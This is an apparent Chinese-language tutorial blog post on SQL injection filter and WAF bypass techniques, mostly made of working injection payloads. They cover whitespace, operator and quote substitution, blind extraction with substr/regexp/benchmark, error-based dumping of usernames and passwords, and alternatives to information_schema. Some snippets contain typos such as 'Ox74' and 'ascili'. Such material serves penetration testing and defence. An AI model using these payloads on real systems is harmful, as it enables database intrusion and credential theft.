---
title: SQL注入防御绕过bypass
date: 2022-12-30 23:01:36
---
# 说的SQL注入
## SQL注入的目的

往参数里恶意拼接sql语句，使数据库执行恶意sql语句，得到相应信息。

## SQL注入漏洞的产生
对方php的sql查询语句可能是这样:
```php
$sql = "select * from My TableName where id=".SGET[id];
$result = Sconn->query($sql);
```
对方接收了一个以GET方式传递的，名叫id的参数。正常传递参数应该是:/?id=1
恶意传递参数可能就会是:`/?id=1 union select 1,databases(),3;`
数据库实际执行的就是: `select * from users where id=1 union select 1,database(),3;`

# 常见bypass思路
## 过滤空格
可以尝试替换空格的方案：  
- `%20` 空格  
- `%09` 相当于TAB键  
- `%0a` 新建一行  
- `%0c` 新的一页  
- `%0d` return功能  
- `%a0` 空  
- `/**/` 注释  
- `/*!*/` 不注释  

注:不注释替换举例:`select * from users /*!where*/ id=1;`

## 过滤 and/or
可以尝试替换and/or的方案：
- `and` 等同于 `&&`
- `or` 等同于 `||`
- `not` 等同于 `!`
- `xor` 等同于 `|`

## 过滤逗号

- 使用`substr`函数:   
    ```sql
    select * from users where id=1 and 't'=(select(substr(database() from 1 for 1)));
    ```

- 使用`mid`函数，使用方法和`substr`完全相同

- 使用`join`函数绕过: 
    ```sql
    select * from users where id=1 union select * from (select database())a join (select 2)b join(select 3)c;
    ```
    2,3替换成要查询的

- 使用`like`模糊查询:  
    ```sql
    select * from users where id=1 and (select database() like 't%');
    ```
    查询到第一个字符后，进行下一个字符的查询

- 使用正则表达式查询:   
    ```sql
    select * from users where id=1 and (select database() regexp '^t');
    ```
    用法和like查询很相似

- 对于`limit 0,1`的绕过，可使用`limit offset`函数:   
    ```sql
    select * from users where id=-1 union select 1,2,3 from users limit 1 offset O;
    ```

## 过滤等于/大于/小于号
有些会拦截`=`号，可以用前面提到的`like`模糊匹配和正则表达式绕过，也可以用大于小于号来绕过(不是大于也不是小于就是等于了)。

- 大于小于号的特殊用法:`<>`等价于`!=`。所以再在前面加上一个`!`就是等于了。  
    ```sql
    select * from users where id=1 and !('t'<>(select(mid(database() from 1 for 1))));
    ```

- 使用`in`关键字:   
    ```sql
    select * from users where id = 1 or substr(username,1,1) in (t);
    ```

- 使用`between a and b`判断:   
    ```sql
    select * from users where id = 1 or substr(username,1,1) between 't' and 't';
    ```

- 拦截`<`或`>`号,可以用`greatest()`来绕过，这个函数的作用是返回括号内的最大值:
    ```sql
    select * from users where id=1 or greatest(ascii(substr(username,1,1)),1)=116;	
    --(116=t)
    ```
    还有相似用法的`least()`返回括号内的最小值。

## 过滤引号
过滤引号需要分情况讨论  

- 如果是开启gpc类的情况(对引号进行转义: `'=>\'`)，可以考虑二次注入或者宽字节注入，下面使用的hex编码也可以使用。

- 如果是直接报错，那就考虑使用hex编码:   
    ```sql
    select * from users where username=Ox74657374;
    ```

- ascii编码也可以:   
    ```sql
    select * from users where username=CHAR(116,101,115,116);
    ```

## 过滤常见函数
有些会拦截常见函数，那么可以用不那么常见的函数去绕过
列举一些例子：

- 过滤`sleep`函数的时候，可以用`benchmark()`来绕过: 
    ```sql
    select * from users where id=1 and if(ascili(substring((select database()),1,1))=116,benchmark(1000000000,1),benchmark(0,1));
    ```

- 过滤`group_concat`的时候，可以用`concat_ws`来绕过: 
    ```sql
    select * from users where id=-1union select 1,count(*),concat_ws('~',(select concat('-',username,':',password) from users limit(0,1),floor(rand(0)*2))) as a from information_schema.tables group by a;
    ```

- 过滤`substr()`的时候，可以用`left()`来绕过

## 编码/双写/大小写绕过
这三种绕过的限制条件比较多

- 编码绕过
    比如payload整体base64编码绕过，硬性要求对方后端代码使用了base64_decode函数，否则的话不能正常解析。

- 双写绕过
    要求对方后端代码是将敏感单词替换为空，这样才能实现绕过:  `selselectect => select`大小写绕过，需要对方使用的替换函数是大小写不敏感的: `SeLeCt * from users;`

## 多参数拆分/chunked编码绕过
这两种绕过方式的核心都是将传输过去的一句指令拆分成多块

- 多参数拆分绕过需要对方同时接受了个参数，比如最常见的同时传递username和password:  
    ```sql
    select * from users where username='test'/*&password=*/and 1=1;
    ```
    这里传递的username=test/*并且password=*/or1=1，这样前后一拼接，就出现了/""/，这一sql中的注释符。所以这里实际执行的代码，其实就是:   
    ```sql
    select * from users where username='test'and 1=1;
    ```

- chunked编码是HTTP中的一种数据传输机制，具体细节可以自行搜索，作用就是将数据分块传输。
    可以使用burpsuite中的chunked-coding-converter插件，一键编码。

## 过滤`information_schema`
`information_schema`在sql注入中的作用是爆出表名和列名，为最后的爆数据做准备。被过滤了只能从其他sql自带的数据库下手，看看有没有和`information_schema`一样的，存储了其他库的表名列名的表。

- 使用`sys.schema_auto_increment_columns`
`sys.schema_auto_increment_columns`用来对表自增ID的监控。并且基本上所有的表都有自增的id，所以这个可以用来查表名。

更多类似的表，可以参考这个博文: 
https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/

- 使用无列名注入
无列名注入主要是利用`join-using`: 
`join`可建立两个表之间的内连接，当自己和自己建立内连接的时候，会由于冗余原因（存在相同列名）报错，并且报错信息会回显重复列名。这时候可以通过`using`来声明内连接的条件，相当于`inner join`，可避免报错  
    ```sql
    select * from users where id=-1 union select * from (select * from users as a join users as b)as c;  
    select * from users where id=-1 union select " from (select * from users as a join users as b using(id,username,password))as c;
    ```